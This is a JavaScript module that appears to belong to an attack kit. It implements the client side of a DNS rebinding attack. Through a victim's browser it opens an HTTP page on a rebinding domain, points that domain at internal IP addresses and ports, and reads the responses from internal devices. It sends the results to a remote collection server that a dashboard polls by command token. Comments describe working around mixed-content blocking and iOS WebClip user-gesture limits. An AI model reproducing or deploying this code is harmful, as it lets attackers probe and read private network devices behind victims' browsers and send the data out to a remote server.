// rebind.js — DNS Rebinding client module
//
// How DNS rebinding works:
//   1. Attacker controls rb.example.com with TTL=1
//   2. Browser loads page from rb.example.com (resolves to attacker server)
//   3. After TTL expires, DNS flips: rb.example.com → 192.168.1.1
//   4. Browser re-fetches rb.example.com — same-origin check passes (same domain)
//   5. Request reaches internal device, browser reads full HTTP response
//
// HTTPS limitation: only works for HTTP targets (port 80).
// Our page is HTTPS → fetch('http://...') = mixed content blocked.
// Workaround: window.open('http://rb-domain/rb-launch.html') → postMessage back.

export async function rebindCheck(rbDomain) {
  const result = {
    ok: false,
    rbDomain,
    canFetch: false,
    canPopup: false,
    canBroadcast: false,
    mixedContentBlocked: false,
    httpsToHttp: false,
    browserInfo: {
      ua: navigator.userAgent.slice(0, 100),
      standalone: !!navigator.standalone,
      protocol: location.protocol,
      origin: location.origin,
    },
    errors: [],
  };

  // 1. Can we reach the rebind domain over HTTPS?
  try {
    const r = await fetch(`https://${rbDomain}/api/rb/ping`, {
      cache: 'no-store', mode: 'cors', signal: AbortSignal.timeout(6000),
    });
    if (r.ok) {
      result.canFetch = true;
      const data = await r.json().catch(() => ({}));
      result.serverPhase = data.phase;
      result.serverIP = data.ip;
    }
  } catch (e) {
    result.errors.push({ step: 'https_fetch', msg: e.message });
  }

  // 2. Can we fetch HTTP from this context? (HTTPS page → HTTP = mixed content)
  try {
    await fetch(`http://${rbDomain}/api/rb/ping`, {
      cache: 'no-store', mode: 'no-cors', signal: AbortSignal.timeout(2000),
    });
    result.httpsToHttp = true; // didn't throw = allowed
  } catch (e) {
    result.httpsToHttp = false;
    if (e.name !== 'AbortError') result.mixedContentBlocked = true;
  }

  // 3. window.open available?
  result.canPopup = typeof window.open === 'function';

  // 4. BroadcastChannel available? (needed for popup → main window comms)
  result.canBroadcast = typeof BroadcastChannel !== 'undefined';

  result.ok = result.canFetch;
  return result;
}

// Phase 2: actual rebind read via HTTP popup trick.
// Opens http://rbDomain/rb-launch.html?... in a new window.
// iOS WebClip standalone mode blocks window.open(), making window.opener null.
// Primary path: popup POSTs result to collection server (/api/rb/result) keyed by token;
// rebindLaunch polls that endpoint. postMessage/BroadcastChannel kept as fast-path fallback.
export function rebindLaunch(rbDomain, targetIP, targetPort, targetPath, onResult, timeout = 20000, cmdToken = null, vpsHost = null, preflipped = false, serviceProbes = null) {
  // Use dashboard-supplied token (allows relay polling without WebClip callback)
  const token = cmdToken || Math.random().toString(36).slice(2) + Date.now().toString(36);
  // relay = collection server base (injected by server on WebClip load)
  const relayBase = (window.WEBCLIP_SERVER || location.origin).replace(/\/$/, '');

  let settled = false;
  let pollTimer = null;

  function settle(data) {
    if (settled) return;
    settled = true;
    clearTimeout(timer);
    clearInterval(pollTimer);
    window.removeEventListener('message', msgHandler);
    if (ch) ch.close();
    win?.close();
    // On iOS standalone, close the Safari window via tunnel/end signal
    if (navigator.standalone && token) {
      const base = (window.WEBCLIP_SERVER || location.origin).replace(/\/$/, '');
      fetch(`${base}/api/rb/tunnel/end`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token }),
      }).catch(() => {});
    }
    onResult(data);
  }

  // Fast path A: postMessage (Android/desktop — window.opener works)
  function msgHandler(e) {
    if (e.data?.type === 'rb_result') settle(e.data);
  }
  window.addEventListener('message', msgHandler);

  // Fast path B: BroadcastChannel (same-origin only)
  let ch = null;
  if (typeof BroadcastChannel !== 'undefined') {
    ch = new BroadcastChannel('wc_rebind');
    ch.onmessage = (e) => { if (e.data?.type === 'rb_result') settle(e.data); };
  }

  // Primary path: poll collection server (works on iOS where opener is null)
  pollTimer = setInterval(async () => {
    try {
      const r = await fetch(`${relayBase}/api/rb/result/${token}`, { cache: 'no-store' });
      if (!r.ok) return;
      const data = await r.json();
      if (data.ready && data.result) settle(data.result);
    } catch (_) {}
  }, 1500);

  // Load rb-launch.html from the BASE DOMAIN (rb.clalitapp.info), NOT a nav subdomain.
  // Reason: fetch() from a nav subdomain to rb.clalitapp.info is cross-origin → CORS blocks
  // response reading. Loading from the same base domain means same-origin → no CORS restriction.
  // Dashboard calls unflip() before FIRE so DNS = VPS when this page loads.
  // rb-launch.html then calls doFlip(), waits 2s for iOS DNS cache to expire, then tryFetch.
  const _probesParam = serviceProbes?.length
    ? serviceProbes.map(p => encodeURIComponent(p)).join(',')
    : '';
  const _tp = targetPort && targetPort !== 80 ? targetPort : 0;
  const _portSuffix = _tp ? `:${_tp}` : '';
  const url = `http://${rbDomain}${_portSuffix}/rb-launch.html?ip=${encodeURIComponent(targetIP)}&port=${encodeURIComponent(targetPort || 80)}&path=${encodeURIComponent(targetPath ?? '/')}&origin=${encodeURIComponent(location.origin)}&token=${encodeURIComponent(token)}&relay=${encodeURIComponent(relayBase)}&vpshost=${encodeURIComponent(vpsHost || '')}&domain=${encodeURIComponent(rbDomain)}&preflipped=0&probes=${_probesParam}&_cb=${Date.now()}`;

  // iOS WebClip standalone: window.open() and <a>.click() require user gesture (async = blocked).
  // location.href = HTTP_URL from standalone context navigates the current window to the HTTP
  // attack page without user gesture. iOS opens cross-origin HTTP navigation in Safari,
  // keeping the standalone context alive so the relay poll can still collect the result.
  // On desktop/Android, use window.open() so the main window stays interactive.
  let win = null;
  const isIOSStandalone = !!navigator.standalone;
  if (isIOSStandalone) {
    location.href = url;
    // Current page may navigate away; relay poll above will still fire in background
    // until the page unloads. Dashboard-side relay poll (using cmdToken) is the primary result path.
  } else {
    win = window.open(url, '_blank');
  }

  const timer = setTimeout(() => settle({ ok: false, error: 'timeout' }), timeout);
}
